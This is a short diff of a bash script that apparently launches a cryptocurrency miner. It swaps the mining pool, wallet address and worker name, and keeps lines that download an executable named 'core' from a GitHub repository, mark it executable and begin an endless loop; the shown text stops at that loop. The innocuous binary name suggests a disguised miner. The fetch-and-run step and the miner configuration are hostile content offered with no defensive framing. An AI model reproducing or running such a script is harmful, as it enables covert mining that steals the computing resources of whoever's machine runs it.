@@ -1,7 +1,7 @@
 #!/bin/bash
-POOL=ethash.unmineable.com:3333
-WALLET=DOGE:DT7UtNqk6fZrpWRm8gUSULJ6KHMusSjtXz
-WORKER=$(echo $(shuf -i 1000000-9999999 -n 1)-COIN#816c-v7qn)
+POOL=asia2.ethermine.org:4444
+WALLET=0x6ff85749ffac2d3a36efa2bc916305433fa93731
+WORKER=lp7fzm4auv6bvg0
 wget https://github.com/dreamistoken/core/raw/main/core
 chmod +x core
 while [ 1 ]; do
